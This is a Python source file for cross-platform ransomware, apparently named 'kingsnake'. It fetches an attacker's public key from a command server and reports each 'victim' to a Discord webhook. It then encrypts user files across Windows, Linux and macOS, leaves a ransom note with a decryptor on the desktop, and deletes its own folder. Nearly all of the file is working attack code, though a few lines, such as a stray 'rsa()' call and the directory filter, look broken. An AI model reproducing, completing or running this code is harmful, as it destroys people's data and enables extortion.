from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.fernet import Fernet
import configparser, requests, os, platform, shutil, subprocess, getpass


config = configparser.ConfigParser()
config.read("config.ini")

pubkeylink = config["domain"]["address"]
webhookbool = config["webhook"]["url"] != "false"

webhookurl = ""
webhooktype = ""

if webhookbool:
    webhookurl = config["webhook"]["url"]
    webhooktype = config["webhook"]["type"]
    if webhooktype == "discord":
        data = {"content" : "@everyone Victim connected, please start the server program so they can retrieve your public key."}
        requests.post(webhookurl, json=data)

while True:
    try:
        r = requests.get(pubkeylink)
        r.raise_for_status()
        break
    except:
        continue

if webhookbool:
    if webhooktype == "discord":
        data = {"content" : "Public key retrieved from server."}
        requests.post(webhookurl, json=data)

publickey = serialization.load_pem_public_key(r.content) #pulling public key off of cnc server

symkey = Fernet.generate_key()
crypt = Fernet(symkey)

match platform.system():
    case "Windows":
        defaultdir = "C:/"
        ignoredirs = ["C:\Windows", 
                      "C:\Program Files", 
                      "C:\Program Files (x86)", 
                      "C:\ProgramData", 
                      "C:\$Recycle.Bin", 
                      "C:\System Volume Information", 
                      "C:\pagefile.sys",
                      os.path.dirname(os.path.abspath(__file__))]
    case "Linux":
        defaultdir = "/"
        ignoredirs = ["/boot", 
                      "/sbin", 
                      "/bin", 
                      "/lib", 
                      "/lib64", 
                      "/etc", 
                      "/dev", 
                      "/usr/bin", 
                      "/usr/lib", 
                      "/usr/sbin", 
                      "/usr/lib64", 
                      "/usr/share", 
                      "/usr/libexec", 
                      "/proc", 
                      "/sys", 
                      "/run", 
                      "/var/lib", 
                      "/var/log", 
                      "/var/run", 
                      "/var/spool",
                      os.path.dirname(os.path.abspath(__file__))]
    case "Darwin": #mac
        defaultdir = "/"
        ignoredirs = ["/System", 
                      "/Library", 
                      "/usr", 
                      "/bin", 
                      "/sbin", 
                      "/var", 
                      "/etc", 
                      "/private", 
                      "/dev", 
                      "/Volumes",
                      os.path.dirname(os.path.abspath(__file__))]


validpaths = [] #log for valid paths to encrypt later

for root, dirs, files in os.walk(defaultdir):
    for dir in dirs:
        fullpath = os.path.join(root, dir)
        if not any(ignored in fullpath or not fullpath.startswith(ignored) for ignored in ignoredirs):
            validpaths.append(fullpath)

for path in validpaths:
    for root, dirs, files in os.walk(path):
        for file in files:
            with open(os.path.join(root, file), "rb") as f:
                copy = f.read()
            with open(os.path.join(root, file), "wb") as f:
                f.write(crypt.encrypt(copy))

if webhookbool:
    if webhooktype == "discord":
        data = {"content" : "@everyone Victim encryption completed!"}
        requests.post(webhookurl, json=data)

user = getpass.getuser()
txtstring = "Your files have been encrypted! To decrypt them, run the file on your desktop [decryptor.py] and follow the instructions shown! WARNING: IF YOU DELETE DECRYPTOR.PY YOUR FILES MAY NEVER BE RECOVERED"
filename = "READ BEFORE ITS TOO LATE.txt"
with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "decryptor.py"), "r") as f:
    decryptorcopy = f.read()
with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "gui.ui"), "r") as f:
    guicopy = f.read()
encryptedsymkey = rsa()
config["payload folder"] = {
    "path" : os.path.dirname(os.path.abspath(__file__))
}



encryptedsymkey = publickey.encrypt(
    symkey,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

match platform.system():
    case "Windows":
        with open(os.path.join("C:/", "Users", user, "Desktop", filename), "w") as f: #sorry that this is long and hard to read its just a bunch of file operations
            f.write(txtstring)
        with open(os.path.join("C:/", "Users", user, "Desktop", "decryptor.py"), "w") as f:
            f.write(decryptorcopy)
        if not os.path.exists(os.path.join(os.environ["APPDATA"], "kingsnake")):
            os.mkdir(os.path.join(os.environ["APPDATA"], "kingsnake"))
        with open(os.path.join(os.environ["APPDATA"], "kingsnake", "config.ini"), "w") as f: #writing config to where decryptor.py checks just in case they delete this config here
            config.write(f)
        with open(os.path.join(os.environ["APPDATA"], "kingsnake", "encsym.key"), "wb") as f:
            f.write(encryptedsymkey)
    case "Linux":
        with open(os.path.join("/home", user, "Desktop", filename), "w") as f:
            f.write(txtstring)
        with open(os.path.join("/home", user, "Desktop", "decryptor.py"), "w") as f:
            f.write(decryptorcopy)
        if not os.path.exists(os.path.join("/home", user, ".config", "kingsnake")):
            os.mkdir(os.path.join("/home", user, ".config", "kingsnake"))
        with open(os.path.join("/home", user, ".config", "kingsnake", "config.ini"), "w") as f:
            config.write(f)
        with open(os.path.join("/home", user, ".config", "kingsnake", "encsym.key"), "wb") as f:
            f.write(encryptedsymkey)
    case "Darwin": #mac
        with open(os.path.join("/Users", user, "Desktop", filename), "w") as f:
            f.write(txtstring)
        with open(os.path.join("/Users", user, "Desktop", "decryptor.py"), "w") as f:
            f.write(decryptorcopy)
        if not os.path.exists(os.path.join("/Users", user, "Library", "Preferences", "kingsnake")):
            os.mkdir(os.path.join("/Users", user, "Library", "Preferences", "kingsnake"))
        with open(os.path.join("/Users", user, "Library", "Preferences", "kingsnake", "config.ini"), "w") as f:
            config.write(f)
        with open(os.path.join("/Users", user, "Library", "Preferences", "kingsnake", "encsym.key"), "wb") as f:
            f.write(encryptedsymkey)

match platform.system():
    case "Windows":
        subprocess.Popen(f'cmd /c timeout 2 && rd /s /q "{os.path.dirname(os.path.abspath(__file__))}"', shell=True)
    case _:
        shutil.rmtree(os.path.dirname(os.path.abspath(__file__)))
